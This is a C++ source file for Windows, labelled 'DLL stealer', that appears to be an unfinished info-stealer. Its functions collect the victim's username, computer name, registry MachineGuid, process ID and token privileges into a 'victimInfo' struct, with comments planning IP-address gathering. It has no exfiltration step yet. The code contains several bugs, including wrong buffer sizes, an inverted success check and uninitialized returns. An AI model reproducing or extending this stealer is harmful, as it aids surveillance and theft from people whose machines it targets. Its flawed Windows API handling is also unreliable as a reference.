#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>
#include <winerror.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <processthreadsapi.h>

//DLL stealer


//gather info (Situational Awareness) 
	//Need way to connect to machine??
//GetHostAddress();  Might not need this


//Computer IP address??
/*
wchar_t *myIPAddress(){
	DWORD bufferSize;
	IP_ADAPTER_ADDRESSES *AdapterAddresses(NULL);
	//Call once to get BufferSize
	ULONG ipSuccess1 = GetAdaptersAddresses(AF_INET, 0 , NULL, AdapterAddresses, &bufferSize);
	if(ipSuccess1!= 0){
		std::wcout << L"ERROR1" << GetLastError() << std::endl;
		return L"FAIL";
	}
	AdapterAddresses = (IP_ADAPTER_ADDRESSES *) malloc(bufferSize);
	//Call again to get actual info
	ULONG ipSuccess2 = GetAdaptersAddresses(AF_INET, 0 , NULL, AdapterAddresses, &bufferSize);
	if(ipSuccess!= 0){
		std::wcout << L"ERROR: " << GetLastError() << std::endl;
		return L"FAIL";
	}

	//Success
	std::wcout << L"SUCCESS!" << std::endl;
	std::wcout << L"THE IP addresses are: " << AdapterAddresses << std::endl;
	
	//Need to loop to get ip address we want
	//might need to set a flag to only have ip4 addresses 
	
	return AdapterAdresses //CHANGE
} */

//Root privileges??
LPVOID checkPrivileges(){
	HANDLE hToken;
	//Use OpenThreadToken to get handle
	bool isOpen = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if(isOpen){
		std::wcout << L"handle is open" << std::endl;
	}
	else{
		std::wcout << L"handle is NOT open" << std::endl;
	}
	/*typedef struct _TOKEN_PRIVILEGES {
  		DWORD               PrivilegeCount;
  		LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
	} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES; */
	TOKEN_PRIVILEGES currentPrivilege; //might need to set this !!
	DWORD retLength;

	
	WINBOOL tokenSuccess1 = GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &retLength); //Use TokenPrivileges option
	std::wcout << L"The bufferSize is " << retLength << std::endl;
	std::wcout << L"The tokensuccess1 is " << tokenSuccess1 << std::endl;
	if(tokenSuccess1 !=0){
		std::wcout << L"PRIVILEGES1 FAILED " << GetLastError() << std::endl;
		LPVOID fail;
		return fail; // "FAIL"
	}
	std::wcout << L"SUCCESS1!" <<std::endl;
	currentPrivilege.PrivilegeCount = retLength;
	currentPrivilege.Privileges[retLength];
	WINBOOL tokenSuccess2 = GetTokenInformation(hToken, TokenPrivileges, currentPrivilege.Privileges, retLength, &retLength); //Use TokenPrivileges option
	std::wcout << L"The tokensuccess2 is " << tokenSuccess2 << std::endl;
	if(tokenSuccess2 != 0){
		std::wcout << L"PRIVILEGES2 FAILED " << GetLastError() << std::endl;
		LPVOID fail;
		return fail; // "FAIL"
	}
	else{
		std::wcout << L"SUCCESS2!" <<std::endl;
		std::wcout << L"The Current Privilege  is " << currentPrivilege.Privileges << std::endl;
		return currentPrivilege.Privileges;
	}

}


//Computer Name
wchar_t *myGetComputerName(){
	wchar_t *compNameBuffer = new wchar_t [MAX_COMPUTERNAME_LENGTH*sizeof(wchar_t) + 1];
	DWORD BufferSize = MAX_COMPUTERNAME_LENGTH*sizeof(wchar_t) + 1;
	long compNameSuccess = GetComputerNameW(compNameBuffer, &BufferSize);
	if(compNameSuccess == 0){
		std::wcout << L"Computer Name FAILED" << std::endl;
		std::wcout << L"BufferSize is: " << BufferSize << std::endl;
		std::wcout << L"Computer Name is" << compNameBuffer << std::endl;
		wchar_t *FAIL = L"FAIL";
		return FAIL;
	}
	else {
		std::wcout << L"SUCCESS!" <<std::endl;
		std::wcout << L"The Computer Name is " << compNameBuffer << std::endl;
		return compNameBuffer; 
	}
}

//Machine Guid
wchar_t *GetMachineGuid (){
	wchar_t *guidBuffer = new wchar_t[255];  //check this size
	DWORD Buffersize = 255;
	HKEY hkey;
	
	//use regopen first
	long regOpenSuccess = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hkey);
	if(regOpenSuccess != ERROR_SUCCESS){
		std::wcout << L"Reg open FAILED " << GetLastError() << std::endl;
		wchar_t *FAIL = L"FAIL";
		return FAIL;
	}
	//RegGetValueW
	long guidSuccess = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", RRF_RT_REG_SZ, NULL, guidBuffer, (LPDWORD) &Buffersize);
	if (guidSuccess!= 0){ 
		std::wcout << L"MACHINE GUID FAILED " << GetLastError() << std::endl;
		wchar_t *FAIL = L"FAIL"; 

		//RegCloseKey	
		RegCloseKey(hkey);
		return FAIL;
	}
	else {
		std::wcout << L"SUCCESS!" <<std::endl;
		std::wcout << L"The Machine Guid is " << guidBuffer << std::endl; //not printing the right thing
		return guidBuffer; 
	}
	//RegCloseKey	
	RegCloseKey(hkey); 
}

//Current Username
wchar_t *myGetUserName(){
	wchar_t *userNameBuffer = new wchar_t[UNLEN*sizeof(wchar_t) + 1]; 
	DWORD BufferSize = sizeof(userNameBuffer);
	long UNSuccess = GetUserNameW(userNameBuffer, &BufferSize);
	if (UNSuccess == 0){
			std::wcout << L"CURRENT USERNAME FAILED" << std::endl;
			wchar_t *FAIL = L"FAIL";
		return FAIL;  
	}
	else {
		std::wcout << L"SUCCESS!" <<std::endl;
		std::wcout << L"The current username is " << userNameBuffer << std::endl;
		return userNameBuffer; 
	}
}


struct victimInfo{
	wchar_t *username = myGetUserName();
	wchar_t *machineGUID = GetMachineGuid();
	wchar_t *computerName = myGetComputerName();
	DWORD currentProcessID = GetCurrentProcessId();
	
	//TO ADD:
	//Privileges
	//Ip address
};


int wmain(int argc, wchar_t* argv[]){

    //call functions
    //myGetUserName(); //works!
    //GetMachineGuid(); //works!
    //myGetComputerName(); //works!
    checkPrivileges(); //returns fail, but handle is open
	//myIPAddress(); //not tested yet

	//CurrentProcessID
	//DWORD currentProcessID = GetCurrentProcessId(); //works!
	//std::wcout << L"Current Process ID is " << currentProcessID << std::endl;

	return 0;
    
}